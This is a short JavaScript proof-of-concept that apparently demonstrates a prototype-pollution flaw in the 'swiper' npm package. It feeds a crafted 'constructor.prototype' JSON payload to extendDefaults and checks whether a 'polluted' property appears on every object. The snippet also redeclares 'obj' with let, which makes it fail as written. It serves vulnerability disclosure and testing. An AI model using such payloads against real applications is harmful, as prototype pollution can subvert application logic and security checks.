var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var swiper = require('swiper');
let obj = {};
var malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
swiper.default.extendDefaults(JSON.parse(malicious_payload));
console.log({}.polluted);